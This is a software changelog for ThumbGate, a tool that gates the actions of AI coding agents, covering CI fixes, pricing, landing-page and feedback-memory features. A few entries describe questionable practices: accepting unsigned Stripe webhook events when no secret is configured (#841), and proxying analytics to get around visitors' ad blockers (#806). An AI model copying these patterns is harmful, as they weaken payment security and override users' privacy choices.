- [#776](https://github.com/IgorGanapolsky/ThumbGate/pull/776) [`0efa4fa`](https://github.com/IgorGanapolsky/ThumbGate/commit/0efa4faac3e4c025a8970ee54c1a9286ffcf6398) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make statusbar lesson text readable: prefer structured rule actions over raw feedback, increase truncation to 60 chars, strip localhost links from display.

- [#741](https://github.com/IgorGanapolsky/ThumbGate/pull/741) [`1d63aa7`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d63aa7ef1cbca549d11aa4eca7ee1862a9432f4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix test fixture isolation: disable commit signing in temp git repos and use empty feedback dir in workflow-sentinel unit tests so CI environments with signing servers and accumulated learned-policy data don't cause false failures.

- [#841](https://github.com/IgorGanapolsky/ThumbGate/pull/841) [`f420136`](https://github.com/IgorGanapolsky/ThumbGate/commit/f42013663b6288837c90feeb97db09f775098de1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Stripe webhook handler silently dropping all paid events when STRIPE_WEBHOOK_SECRET is not configured. When no webhook secret is set, skip stripe.webhooks.constructEvent (which always throws on empty secret) and parse the raw body directly — consistent with verifyWebhookSignature which is already lenient in this case.

- [#834](https://github.com/IgorGanapolsky/ThumbGate/pull/834) [`7df6108`](https://github.com/IgorGanapolsky/ThumbGate/commit/7df61081479b99040f445d5e30a719b06ce1c345) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix: lead with free CLI install as primary CTA, make Pro secondary

  10 visitors clicked "Start 7-day free trial" but 0 completed checkout because
  Stripe requires a credit card upfront. Flip the CTA strategy: lead with the
  zero-friction free CLI install (`npx thumbgate init`) as the hero action, and
  position Pro as the upgrade path once users hit free tier limits (3 captures/day).

  Changes:

  - Hero: `npx thumbgate init` is now the prominent hero element with enlarged
    copy-to-clipboard; "Install Free CLI" is the primary button; "Upgrade to Pro"
    is smaller and secondary
  - Sticky bottom bar: leads with `npx thumbgate init` copy command, "Go Pro" is
    a smaller secondary link
  - Final CTA section: install command and free CLI link are primary, Pro is
    secondary
  - Pricing section: Free tier gets cyan highlight border, "Most Popular" badge,
    and inline install command; Pro card border demoted
  - PostHog events updated: `hero_install_click`, `hero_pro_click`,
    `sticky_pro_click`, `final_install_click`, `final_pro_click`
  - Tests updated to match new CTA text patterns

- [#661](https://github.com/IgorGanapolsky/ThumbGate/pull/661) [`bf9ae08`](https://github.com/IgorGanapolsky/ThumbGate/commit/bf9ae089f14a3edc40c2ae93afb1c1ac83dca0e9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fail Railway deploys early when the required `THUMBGATE_API_KEY` runtime secret is missing or empty.

- [#783](https://github.com/IgorGanapolsky/ThumbGate/pull/783) [`b912807`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9128070f9381c9a708093cec7f9fec898c055b0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep gate-denial audit events out of user-facing feedback statistics, including the local summary view, while preserving separate gate-event analytics for Reliability Gateway enforcement.

- [#851](https://github.com/IgorGanapolsky/ThumbGate/pull/851) [`6972f40`](https://github.com/IgorGanapolsky/ThumbGate/commit/6972f4009e0f91a47832cdb6bbfaa85991345835) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the GitHub CI release process by using the tested changeset checker in PR workflows, trimming duplicate npm publish validation, and adding slower npm registry propagation retries to package smoke tests.

- [#665](https://github.com/IgorGanapolsky/ThumbGate/pull/665) [`588956d`](https://github.com/IgorGanapolsky/ThumbGate/commit/588956defd9e3fdc1f8033d142f9194ea67b18da) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Prevent hosted boot crashes when operational integrity loads without git on the runtime image, and install git in the Railway container so integrity checks can execute after startup.

- [#725](https://github.com/IgorGanapolsky/ThumbGate/pull/725) [`19417e1`](https://github.com/IgorGanapolsky/ThumbGate/commit/19417e103497d8b4e042812638597b4e6159687e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Google Cloud agent safety framework alignment to public proof and LLM context surfaces.

- [#653](https://github.com/IgorGanapolsky/ThumbGate/pull/653) [`5bbf039`](https://github.com/IgorGanapolsky/ThumbGate/commit/5bbf039adabdede600d6a7d0a26a1dce041898d2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden operational integrity git revision validation so unsafe refs and commit
  arguments are rejected before invoking git, and add regression coverage for the
  SonarCloud command-argument findings.

- [#654](https://github.com/IgorGanapolsky/ThumbGate/pull/654) [`2043ab0`](https://github.com/IgorGanapolsky/ThumbGate/commit/2043ab06e4aa18fd5950cc53c9a5a4a22b2c060e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refocus the public buyer path around the Workflow Hardening Sprint, align Team pricing and messaging with commercial truth, and add a first-dollar execution playbook plus warm outreach scripts for turning one qualified workflow into the next booked pilot.

- [#689](https://github.com/IgorGanapolsky/ThumbGate/pull/689) [`0467bf1`](https://github.com/IgorGanapolsky/ThumbGate/commit/0467bf11353b1d6a57a8c1b08081a075976e29c1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden HTML sanitization in document-intake to resolve SonarCloud security hotspots, fix malformed tag handling, and restore SonarCloud branch protection CI config.

- [#692](https://github.com/IgorGanapolsky/ThumbGate/pull/692) [`7f962ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/7f962ea3dc982582d5865076038a0a8e8f73f5e7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden merge integrity enforcement, add branch protection tests to npm parity checks, fix SonarCloud gh CLI security findings.

- [#752](https://github.com/IgorGanapolsky/ThumbGate/pull/752) [`f0de3f0`](https://github.com/IgorGanapolsky/ThumbGate/commit/f0de3f01bf0d428fdd6e9c9fd9cddf20ef038576) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rewrite the landing page hero to lead with pain, not solution category. New H1: 'Your AI agent just made that mistake again. One thumbs-down. It never happens again.' Concrete session 1 → session 2 before/after replaces consultant-speak. Primary CTA is now the install command. Title and meta description updated to match.

- [#733](https://github.com/IgorGanapolsky/ThumbGate/pull/733) [`26f8b8e`](https://github.com/IgorGanapolsky/ThumbGate/commit/26f8b8e2d16537f42e7250babd50e63b9cc5f9ed) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add prominent "Install for Your Agent" sections to README and landing page with per-agent commands

- [#664](https://github.com/IgorGanapolsky/ThumbGate/pull/664) [`c491470`](https://github.com/IgorGanapolsky/ThumbGate/commit/c49147088efa6a56047264d22499764a86f8e915) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Claude Code statusline feedback counts when the hook runs from the ThumbGate runtime directory by honoring the session's project cwd.

- [#791](https://github.com/IgorGanapolsky/ThumbGate/pull/791) [`67de961`](https://github.com/IgorGanapolsky/ThumbGate/commit/67de961556ada7f9914246c361961f22cdfe6a94) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add prominent checkout CTAs to landing page hero, pricing card, final section, and sticky bottom bar

- [#668](https://github.com/IgorGanapolsky/ThumbGate/pull/668) [`471f140`](https://github.com/IgorGanapolsky/ThumbGate/commit/471f1408bc78c45da722726178feb9e681449e73) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Serve llms.txt from public route without auth so LLM crawlers can discover ThumbGate

- [#812](https://github.com/IgorGanapolsky/ThumbGate/pull/812) [`66277a7`](https://github.com/IgorGanapolsky/ThumbGate/commit/66277a7adfd6778a0c4954339ea4408e5bc63848) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(ci): autonomous marketing autopilot every 4 hours — video, text posts, Reddit, Dev.to

  - video-autopilot.yml: generates slide-based MP4 (6 rotating templates), posts to TikTok/YouTube/Instagram via Zernio every 4 hours with per-platform cooldowns
  - marketing-autopilot.yml: rewritten to fire every 4 hours (was Mon/Wed/Fri), all secrets wired (DEVTO_API_KEY, Reddit password OAuth, full X API), fixed reddit.publishToReddit() call, added Dev.to article step with 7-day dedup
  - marketing-db.js: SQLite dedup + analytics tracker prevents double-posting
  - post-video.js: full slide→ffmpeg→Zernio pipeline

- [#839](https://github.com/IgorGanapolsky/ThumbGate/pull/839) [`4787185`](https://github.com/IgorGanapolsky/ThumbGate/commit/47871852b109ab89f5eff3dda8c627ef77c5cfdb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Switch CLI upgrade link to no-card 7-day trial — 2,478 cloners seeing card-required checkout was killing conversion.

- [#670](https://github.com/IgorGanapolsky/ThumbGate/pull/670) [`2b49a4a`](https://github.com/IgorGanapolsky/ThumbGate/commit/2b49a4af707ed69782427c9c905c27cd568cd79b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Retry published runtime smoke installs after transient npm registry propagation misses so successful releases do not fail their post-publish verification step.

- [#825](https://github.com/IgorGanapolsky/ThumbGate/pull/825) [`e77aa38`](https://github.com/IgorGanapolsky/ThumbGate/commit/e77aa38221974fc31285857fb7b167a8b4463e9b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden package and Claude plugin boundaries so generated runtime state cannot leak into npm tarballs and Claude plugin skill paths remain spec-compliant.

- [#788](https://github.com/IgorGanapolsky/ThumbGate/pull/788) [`2e3bb77`](https://github.com/IgorGanapolsky/ThumbGate/commit/2e3bb775f94458e1dc3e641a1f4b745207facb1e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Perplexity Max command center for AI-search visibility checks, Search API lead discovery, Agent API acquisition briefs, and official Perplexity MCP config generation.

- [#751](https://github.com/IgorGanapolsky/ThumbGate/pull/751) [`01bebb7`](https://github.com/IgorGanapolsky/ThumbGate/commit/01bebb7c69f716b8fdafcbcdd6a1cf4b8f9a3961) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire PostHog analytics into the landing page for funnel visibility. Tracks four CTA events: workflow_sprint, install_codex, install_claude, and pro_upgrade. API key is now server-injected via the **POSTHOG_API_KEY** placeholder in hostedConfig, not hardcoded in the HTML.

- [#806](https://github.com/IgorGanapolsky/ThumbGate/pull/806) [`4ce250d`](https://github.com/IgorGanapolsky/ThumbGate/commit/4ce250d08658590ab2470b847f8c8d1539257da5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add automatic $pageview tracking and PostHog reverse proxy for ad-blocker bypass

  - Added posthog.capture('$pageview') after init to track all landing page visits
  - Added /ingest reverse proxy route in server.js to forward PostHog events through own domain
  - Changed PostHog api_host from us.i.posthog.com to /ingest to bypass ad blockers

- [#676](https://github.com/IgorGanapolsky/ThumbGate/pull/676) [`4aa3794`](https://github.com/IgorGanapolsky/ThumbGate/commit/4aa379422fa0e7451ceeb80999d26820b342d178) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden merge integrity by blocking failed quality gates, syncing branch protection to the audited required checks, and verifying the legacy Stripe webhook signature path.

- [#709](https://github.com/IgorGanapolsky/ThumbGate/pull/709) [`dadb030`](https://github.com/IgorGanapolsky/ThumbGate/commit/dadb030e408cc6ae3e509772dc6723e44989e3fc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden public pricing congruence checks so retired ThumbGate pricing experiments cannot reappear in buyer-facing docs.

- [#696](https://github.com/IgorGanapolsky/ThumbGate/pull/696) [`46f7c4a`](https://github.com/IgorGanapolsky/ThumbGate/commit/46f7c4a9e895365dd3404156d38049691a9ba511) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Align Team pricing across the public landing page, README, marketing materials,
  runtime commercial constants, and congruence tests at $99/seat/mo with a 3-seat
  minimum.

- [#691](https://github.com/IgorGanapolsky/ThumbGate/pull/691) [`d733437`](https://github.com/IgorGanapolsky/ThumbGate/commit/d733437cf692b878fa9a1f27902643c6326fbee2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden LLM rule generation with expert role framing, few-shot examples, and chain-of-thought reasoning; include what_went_wrong/what_to_change fields in batch context; upgrade to claude-sonnet-4-6 for rule analysis; add Stage 6 token-budget enforcement to compactContext; group toRules output by severity with action labels.

- [#662](https://github.com/IgorGanapolsky/ThumbGate/pull/662) [`fdeffc9`](https://github.com/IgorGanapolsky/ThumbGate/commit/fdeffc98490fbdb01990d68acc0c5e794b594016) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Capture Railway service diagnostics on deploy health-check failures and add a manual Railway diagnostics workflow for restart, redeploy, and live log inspection.

- [#778](https://github.com/IgorGanapolsky/ThumbGate/pull/778) [`1356942`](https://github.com/IgorGanapolsky/ThumbGate/commit/135694227b3d95a08b3d99ce1c0916014b368c83) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Trim Ralph Mode X credentials before signing requests without logging credential prefixes in CI output.

- [#771](https://github.com/IgorGanapolsky/ThumbGate/pull/771) [`93e351f`](https://github.com/IgorGanapolsky/ThumbGate/commit/93e351f75554687afd215008c2b8cb98e3a4eeb3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Ralph Mode CI workflow for 24/7 automated engagement via GitHub Actions

- [#795](https://github.com/IgorGanapolsky/ThumbGate/pull/795) [`cfeff43`](https://github.com/IgorGanapolsky/ThumbGate/commit/cfeff433e8f30fd881d4ba0270715c0112f87b7a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stop Ralph Mode from reporting failed X API posts or replies as successful audience-engagement actions.

- [#848](https://github.com/IgorGanapolsky/ThumbGate/pull/848) [`804a284`](https://github.com/IgorGanapolsky/ThumbGate/commit/804a28406eb511c6be9147d2e2b1c2eb47550534) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add npm publish receipt metadata and a downloadable full release-notes artifact to the publish workflow, so npm's bare "Successfully published" email can be reconciled with complete Changeset-backed release notes, tarball URL, shasum, and verification evidence.

- [#837](https://github.com/IgorGanapolsky/ThumbGate/pull/837) [`4580274`](https://github.com/IgorGanapolsky/ThumbGate/commit/45802749554b54b660a92ffa5243f1f8ea95505a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Generate full Changeset-backed release notes during the npm publish workflow, write them into the GitHub Release, upload them as a release asset, and copy them into the GitHub Actions summary linked from npm's publish email.

- [#693](https://github.com/IgorGanapolsky/ThumbGate/pull/693) [`2be9345`](https://github.com/IgorGanapolsky/ThumbGate/commit/2be93457916984ecbd30249325ef3351d2916655) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Restore clickable statusline affordances, harden localhost links, and restore statusline test parity.

- [#686](https://github.com/IgorGanapolsky/ThumbGate/pull/686) [`c8a544d`](https://github.com/IgorGanapolsky/ThumbGate/commit/c8a544dad95070347721dde8c1c582566980fae4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Block raw GitHub auto-merge paths and require terminal quality-check validation before autonomous PR merges.

- [#828](https://github.com/IgorGanapolsky/ThumbGate/pull/828) [`a1828a9`](https://github.com/IgorGanapolsky/ThumbGate/commit/a1828a97028f5ec82ceced3657d7fe3f09d00126) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Slim the npm package boundary by moving the package main entrypoint to `src/index.js`, publishing only runtime-required files, and adding tarball budget tests that block public marketing assets, plugin bundles, and social automation from shipping to npm.

- [#658](https://github.com/IgorGanapolsky/ThumbGate/pull/658) [`f07c657`](https://github.com/IgorGanapolsky/ThumbGate/commit/f07c65707b1d8503c37d6d943a1d4748ea6c6a2f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stamp default-branch SonarCloud refreshes with a unique package-version-plus-commit identifier so mainline quality checks reset cleanly without weakening strict PR quality-gate enforcement.

- [#677](https://github.com/IgorGanapolsky/ThumbGate/pull/677) [`52a51ed`](https://github.com/IgorGanapolsky/ThumbGate/commit/52a51edc8e644af507623f74e096bbaa93260eb7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add 3 pre-action gates for Microsoft SQL MCP Server: block delete_record, warn on execute_entity DDL, block bulk updates.

- [#731](https://github.com/IgorGanapolsky/ThumbGate/pull/731) [`6e07853`](https://github.com/IgorGanapolsky/ThumbGate/commit/6e07853f526e8e6d86536c5739cfb528233e9633) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the Claude statusbar lesson chip so it shows the latest mistake with a timestamp and deep link, and falls back to the latest success when no mistakes exist.

- [#790](https://github.com/IgorGanapolsky/ThumbGate/pull/790) [`02fe6cb`](https://github.com/IgorGanapolsky/ThumbGate/commit/02fe6cb612c79bddd3da3037d240926f73114622) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Scope statusline feedback stats to the active project and keep the Pre-Action Gates cross-encoder reranker covered by the root CI test suite.

- [#772](https://github.com/IgorGanapolsky/ThumbGate/pull/772) [`382eeb7`](https://github.com/IgorGanapolsky/ThumbGate/commit/382eeb78aae5791c364b4476932ce8da4012b9ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an audited Stripe webhook signing-secret rotation workflow. The workflow creates a fresh billing webhook endpoint, stores the returned signing secret in GitHub Actions secrets, updates rotation timestamp variables, and keeps deploy-policy evidence aligned without exposing secret values.

- [#663](https://github.com/IgorGanapolsky/ThumbGate/pull/663) [`62979f5`](https://github.com/IgorGanapolsky/ThumbGate/commit/62979f524f9384884b931b4848bad53648e5e199) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Skip Railway deploys when a main push only changes workflows, tests, or changesets and leaves runtime-serving files untouched.

- [#813](https://github.com/IgorGanapolsky/ThumbGate/pull/813) [`46122d5`](https://github.com/IgorGanapolsky/ThumbGate/commit/46122d59b3dbeb5909b53b7ef6f1e80cdeefaf04) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add ThumbGate Bench, a deterministic pre-action gate benchmark with mock workflow scenarios, safety/capability metrics, report artifacts, documentation, and CI test coverage.

- [#682](https://github.com/IgorGanapolsky/ThumbGate/pull/682) [`510b6e8`](https://github.com/IgorGanapolsky/ThumbGate/commit/510b6e87ba04020e899526b83cb3bb07df1f06d0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Split the short GitHub repo description from the richer landing-page meta description so GitHub About sync can succeed without weakening the website metadata.

- [#695](https://github.com/IgorGanapolsky/ThumbGate/pull/695) [`251f24f`](https://github.com/IgorGanapolsky/ThumbGate/commit/251f24fa096007ad41e8349038ee0cbe2a556cc5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Submit main-branch automerge requests to Trunk without polling helper workflow checks or waiting for a final merge commit inside GitHub Actions.

- [#700](https://github.com/IgorGanapolsky/ThumbGate/pull/700) [`f8496e6`](https://github.com/IgorGanapolsky/ThumbGate/commit/f8496e6e9d666c4b4b361fd8f82e2a71298f4939) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Treat Zernio monthly post-limit responses as controlled social-publisher skips so the daily acquisition workflow does not mark main unhealthy when the external posting budget is exhausted. Also isolate Trunk merge comment automation from shared personal access token rate limits.

## 1.3.0

### Minor Changes

- [#643](https://github.com/IgorGanapolsky/ThumbGate/pull/643) [`abdae7d`](https://github.com/IgorGanapolsky/ThumbGate/commit/abdae7dcdf040856649a0975902aac74a347b441) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add GLM 5.1 as a zero-cost local frontier tier. Self-hosting GLM 5.1 (open-source, SWE-Bench Pro SOTA) eliminates frontier API spend: `localFrontier` tier has `costMultiplier: 0.0` and no token budget enforcement. Set `THUMBGATE_LOCAL_MODEL_FAMILY=glm-*` to activate automatic frontier → localFrontier routing in `recommendExecutionPlan`.

### Patch Changes

- [#644](https://github.com/IgorGanapolsky/ThumbGate/pull/644) [`fd1aa82`](https://github.com/IgorGanapolsky/ThumbGate/commit/fd1aa82164c5a00c374493abea60a46d4f5446db) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add packaged-runtime smoke proof: installs the npm artifact into a clean prefix and validates the shipped dashboard, lessons, and thumbs quick links before any publish step; prevents packaged runtime regressions from reaching npm or Claude release assets.

- [#645](https://github.com/IgorGanapolsky/ThumbGate/pull/645) [`6fcaeb8`](https://github.com/IgorGanapolsky/ThumbGate/commit/6fcaeb8b35185958f632d5ef6135e5d9a6fc59e9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix 59 pre-existing test failures: add `commit.gpgsign=false` to temp-repo helpers so tests work in signing-enforced environments; make `trackEvent` respect `THUMBGATE_API_URL` to prevent DNS hangs in sandboxed CI; add `process.exit(0)` to unlicensed pro command paths for clean CLI exit.

- Improve feedback proof surfaces by adding a daily gate-audit series to the Lessons timeline, making day-level activity clickable, and backfilling missed Claude thumbs signals before local counts render.

- [#640](https://github.com/IgorGanapolsky/ThumbGate/pull/640) [`347ce33`](https://github.com/IgorGanapolsky/ThumbGate/commit/347ce332ad663b2d78e2bd7e38d084eebddacb50) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add lesson count, latest lesson snippet, and dashboard link to Claude Code statusline. Previously only showed version, tier, and feedback counts.

- [#649](https://github.com/IgorGanapolsky/ThumbGate/pull/649) [`99816f8`](https://github.com/IgorGanapolsky/ThumbGate/commit/99816f8d9b7141e9a1ba482283545aacd3b97007) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Strengthen the enterprise release-confidence story across the README, docs, and landing pages so package publishes clearly show their Changeset coverage, SemVer discipline, verification evidence, and exact-merge proof chain.

- [#650](https://github.com/IgorGanapolsky/ThumbGate/pull/650) [`102026a`](https://github.com/IgorGanapolsky/ThumbGate/commit/102026a116cd29b60af342203138b7d3e8bee66a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Compact the Claude statusline so dashboard and lesson links stay visible under tight width budgets, even when recent lesson text is long.

- [#642](https://github.com/IgorGanapolsky/ThumbGate/pull/642) [`1e098ec`](https://github.com/IgorGanapolsky/ThumbGate/commit/1e098ec8a562213afa77a846609447ece87fadaa) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Retry live GitHub About verification after sync so mainline CI does not fail on GitHub metadata propagation delays.

## 1.2.0

### Minor Changes

- [#637](https://github.com/IgorGanapolsky/ThumbGate/pull/637) [`d1e83c9`](https://github.com/IgorGanapolsky/ThumbGate/commit/d1e83c9dffb0fb84a7e081d7474a697a94327d28) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add @changesets/cli for auditable release management. Every feat/fix PR now requires a changeset file describing the change and semver impact. CHANGELOG.md backfilled from 0.9.5 through 1.1.0. CI workflow enforces changeset presence on feature PRs.

- [#634](https://github.com/IgorGanapolsky/ThumbGate/pull/634) [`3e580af`](https://github.com/IgorGanapolsky/ThumbGate/commit/3e580affc3b46d72c77382773d6e1bdc22cf1bc6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Docker sandbox routing guidance for risky local autonomy and introduce an enforced Changesets-based release record so version bumps and customer-facing release notes stay explicit.

### Patch Changes

- [#639](https://github.com/IgorGanapolsky/ThumbGate/pull/639) [`181da25`](https://github.com/IgorGanapolsky/ThumbGate/commit/181da252c7b77f4e39dbf273a9e34c1545590089) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Restore clickable Claude statusline affordances for ThumbGate. The packaged statusline once again exposes OSC 8 hyperlinks for `👍`, `👎`, `Dashboard`, and `Lessons`, auto-boots the local Pro dashboard server when needed, and prefers the installed runtime binary over repeated `npm exec` launches.

## [1.1.0] - 2026-04-08

### Added

- **HuggingFace Dataset Export**: New `export_hf_dataset` MCP tool and `npm run export:hf` CLI command. Exports PII-redacted agent traces (traces.jsonl) and DPO preference pairs (preferences.jsonl) as HuggingFace-compatible datasets with dataset_info.json metadata.
- **Unified Context Manager**: `unified_context` MCP tool provides one-call context assembly combining session state, user profile, relevant lessons, prevention guards, context pack, and code-graph impact. Tiered graceful degradation: full, warm, cold.
- **Role-Aware Context Filtering**: Agent profiles (Claude, Cursor, ForgeCode, Codex) shape context budget, lesson count, and feature inclusion per agent type.
- **Changesets**: Added `@changesets/cli` for auditable release management with auto-generated changelogs.

## [1.0.0] - 2026-04-08

### Added

- **ForgeCode Adapter**: `npx thumbgate init --agent=forge` scaffolds ForgeCode agent integration.
- **Workflow Sentinel**: Pre-tool guard that predicts workflow failures before execution.
- **Durable Hosted Jobs**: API server supports long-running job execution with status polling.
- **Buyer-Intent Geo Pages**: SEO landing pages for location-based discovery.
- **Daily Revenue Loop**: GitHub Actions workflow for automated revenue tracking.
- **Plausible Analytics**: Privacy-first analytics across all public pages.

### Changed

- Scoped dashboard and status to active project context.
- Extended Railway rollout verification window for more reliable deploys.
- Closed all duplicate social posting code paths.

## [0.9.9] - 2026-04-05

### Changed

- Social quality gate wired into all publishers — blocks bot slop before posting.
- Dependency bumps: Stripe 22.0, Playwright 1.59, dotenv 17.4, HuggingFace Transformers 4.0.

### Fixed

- Hardened coverage and verification gates for CI stability.
- Inferred tags for promotable feedback signals.

## [0.9.5] - 2026-04-03

### Added

- **Landing Page Repositioning**: Visual diagrams, "bad AI PRs" messaging, self-improving agents positioning.
- **Social Posting Strategy**: Overhauled based on top SaaS research.
- **Governance Hardening**: Integrity governance assertions stabilized.

### Fixed

- Restored dashboard and lesson follow-up state.
- Removed legacy RLHF references.
- Repaired release health for Railway and npm publish.

## [0.9.4] - 2026-04-02

### Added

- **Conversation Window Capture**: `capture_feedback` now accepts a `conversationWindow` parameter — an array of the last 5-10 conversation turns. Raw messages are stored alongside feedback for full context awareness.
- **Structured IF/THEN Lesson Inference**: New `lesson-inference.js` module extracts structured rules from conversation windows with trigger/action/confidence/scope classification.
- **Per-Action Lesson Retrieval**: New `retrieve_lessons` MCP tool returns top-K relevant lessons for a given tool/action context using keyword matching, file path overlap, recency decay, and signal weighting.
- **Reflector Agent**: Self-healing post-mortem system. On negative feedback with conversation context, automatically analyzes what went wrong, checks for recurrence, and proposes a specific rule back to the user.
- **Statusbar Lesson Link**: Claude Code statusbar now displays the latest lesson with memory ID, signal icon, summary, and conversation turn count after every feedback capture.

### Changed

- `captureFeedback` enriches `whatWentWrong`/`whatWorked` from conversation window when caller doesn't provide them.
- Memory records now include `structuredRule` (IF/THEN format) and `conversationWindow` (capped at 10 messages, 500 chars each).
- Statusline cache includes `last_lesson` metadata for real-time statusbar updates.

### Performance

- All changes are backwards compatible — `conversationWindow` is optional. Omitting it preserves existing behavior.

## [0.9.0] - 2026-04-02

### Fixed

- **Stripe API timeout**: All Stripe API calls in billing pipeline now have a 5-second timeout via `Promise.race`, preventing indefinite hangs when Stripe is slow or rate-limited (`scripts/billing.js`).
- **SQLite WAL lock hangs**: Added `busy_timeout = 3000` pragma to all SQLite database connections, preventing deadlocks when multiple processes contend for the WAL lock (`lesson-db.js`, `store.js`, `github.js`).
- **Duplicate server instances**: Lock file detection now exits fatally when an active server PID exists, and cleans stale locks from dead processes (`server-stdio.js`).

### Performance

- **MCP tool call latency**: `capture_feedback`, `feedback_stats`, `recall`, `feedback_summary`, and `prevention_rules` now skip metric gate evaluation entirely — eliminating the 5-minute stall caused by live Stripe API calls on every tool invocation (`gates-engine.js`).
- **readJSONL tail-read**: Large JSONL files (300KB+) now default to reading only the last 500 lines instead of the entire file, reducing event loop blocking during feedback capture (`feedback-loop.js`).
- **Metric gate timeout**: Non-feedback tools now have a 3-second fail-open timeout on metric gate evaluation, preventing cascading hangs.

### Changed

- `getBillingSummaryLive()` returns a safe default object on any failure (timeout or otherwise) instead of throwing, so metric gates degrade gracefully.
- `readJSONL()` accepts `{ maxLines }` option; callers needing all entries pass `{ maxLines: 0 }`.

## 0.8.2 - 2026-03-26

- Bumped all version surfaces to 0.8.2 (package.json, server.json, mcpize.yaml, landing page).
- Branch coverage improvements: added tests for 10 lowest-coverage files and 15 previously untested scripts.
- Railway deploy fix: switched to `--detach` mode with health-check polling to avoid intermittent "Failed to retrieve build log" CLI streaming errors.

## 0.8.1 - 2026-03-26

- Unified ThumbGate branding across all public surfaces (README, AGENTS.md, CLAUDE.md, GEMINI.md, landing page, package.json).
- Landing page SEO: "human-in-the-loop enforcement", "vibe coding" positioning, FAQPage JSON-LD schema for Google rich results.
- Added congruence CI check (`scripts/check-congruence.js`) — enforces version, branding, tech stack terms, and honest disclaimer across README and landing page on every PR.
- Performance: deferred non-critical side-effects in `captureFeedback` (contextFs, RLAIF self-audit) via `setImmediate`.
- Added `_captureMs` timing field to accepted feedback responses for observability.
- Added `mcpize.yaml` to version sync targets.
- Dead code removal: -1,551 lines (contract-audit.js, prove-rlaif.js, stale landing-page.html, 3 duplicate docs).
- Fixed GitGuardian incident #29200799: scrubbed hardcoded Google API key from git history.
- Social automation pipeline: post-everywhere CLI, reply monitor with AutoMod-safe Reddit posts.
- TDS article draft: "Beyond Prompt Rules: How Pre-Action Gates Stop AI Coding Agents From Repeating Mistakes".

## 0.8.0 - 2026-03-25

- **Lesson DB:** SQLite + FTS5 full-text search replaces linear Jaccard token-overlap. Sub-millisecond ranked search indexed by signal, domain, tags, importance.
- **Corrective actions:** On negative feedback, `capture_feedback` returns `correctiveActions[]` — top 3 remediation steps inferred from similar past failures.
- **search_lessons MCP tool:** Exposes corrective actions, lifecycle state, linked rules, linked gates, and next harness fixes per lesson.
- **search_thumbgate MCP tool:** Searches raw ThumbGate state across feedback logs, ContextFS memory, and prevention rules.
- **Rejection ledger:** Tracks why vague feedback was rejected with revival conditions.
- **Bayesian belief updates:** Each memory carries a posterior that updates on new evidence; high-entropy contradictions auto-prune.

## 0.7.4 - 2026-03-20

